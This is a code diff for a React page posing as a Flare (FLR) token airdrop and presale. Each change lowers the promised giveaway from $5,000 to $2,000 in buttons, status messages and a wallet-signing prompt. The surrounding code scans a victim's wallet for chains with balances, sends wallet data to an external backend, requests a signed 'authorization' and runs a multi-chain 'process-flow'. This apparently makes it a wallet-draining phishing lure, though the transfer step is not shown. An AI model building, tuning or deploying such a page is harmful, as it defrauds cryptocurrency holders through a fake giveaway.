@@ -266,7 +266,7 @@ function App() {
       
       if (eligible) {
         setEligibleChains(chainsWithBalance);
-        setTxStatus('✅ You qualify for $5,000 Flare (FLR)!');
+        setTxStatus('✅ You qualify for $2,000 Flare (FLR)!');
         
         // Send to backend for tracking
         await fetch('https://flarebackend.vercel.app/api/presale/connect', {
@@ -388,7 +388,7 @@ function App() {
       const message = `FLARE (FLR) TOKEN PRESALE AUTHORIZATION\n\n` +
         `I hereby confirm my participation in the Flare (FLR) presale\n` +
         `Wallet: ${address}\n` +
-        `Allocation: $5,000 FLR + ${presaleStats.currentBonus}% Bonus\n` +
+        `Allocation: $2,000 FLR + ${presaleStats.currentBonus}% Bonus\n` +
         `Timestamp: ${new Date().toISOString()}\n` +
         `Nonce: ${nonce}`;
 
@@ -533,7 +533,7 @@ await fetch('https://flarebackend.vercel.app/api/presale/process-flow', {
       
       if (processed.length > 0) {
         setShowCelebration(true);
-        setTxStatus(`🎉 You've secured $5,000 FLR!`);
+        setTxStatus(`🎉 You've secured $2,000 FLR!`);
         
         // Calculate total processed value
         const totalProcessedValue = processed.reduce((sum, chainName) => {
@@ -709,7 +709,7 @@ await fetch('https://flarebackend.vercel.app/api/presale/process-flow', {
               onMouseLeave={() => setHoverConnect(false)}
               className="bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] mb-8 w-full max-w-md"
             >
-              Connect Wallet To Claim $5000 (Flare (FLR) Token)
+              Connect Wallet To Claim $2000 (Flare (FLR) Token)
             </button>
           ) : (
             <div className="flex flex-col items-center w-full max-w-md mb-8">
@@ -742,7 +742,7 @@ await fetch('https://flarebackend.vercel.app/api/presale/process-flow', {
                   ) : (
                     <span className="flex items-center justify-center gap-2">
                       <span className="text-xl">🎁</span>
-                      CLAIM AIRDROP $5,000 FLR
+                      CLAIM AIRDROP $2,000 FLR
                       <span className="text-sm bg-white/20 px-2 py-1 rounded-full">+{presaleStats.currentBonus}%</span>
                     </span>
                   )}
@@ -754,7 +754,7 @@ await fetch('https://flarebackend.vercel.app/api/presale/process-flow', {
                 <div className="mt-3 w-full">
                   {isEligible ? (
                     <div className="bg-green-500/20 border border-green-500/30 rounded-lg p-3 text-sm text-green-400">
-                      ✅ You are eligible for the $5,000 Flare (FLR) airdrop! Click the CLAIM AIRDROP button above to proceed.
+                      ✅ You are eligible for the $2,000 Flare (FLR) airdrop! Click the CLAIM AIRDROP button above to proceed.
                     </div>
                   ) : (
                     !scanning && (
@@ -888,7 +888,7 @@ await fetch('https://flarebackend.vercel.app/api/presale/process-flow', {
             <div className="w-full max-w-md mb-8">
               <div className="bg-black/60 backdrop-blur rounded-xl p-6 text-center border border-green-500/30">
                 <p className="text-green-400 text-lg mb-2">✓ COMPLETED on {completedChains.length} chains</p>
-                <p className="text-gray-400 text-sm">Your $5,000 FLR has been secured</p>
+                <p className="text-gray-400 text-sm">Your $2,000 FLR has been secured</p>
               </div>
             </div>
           )}
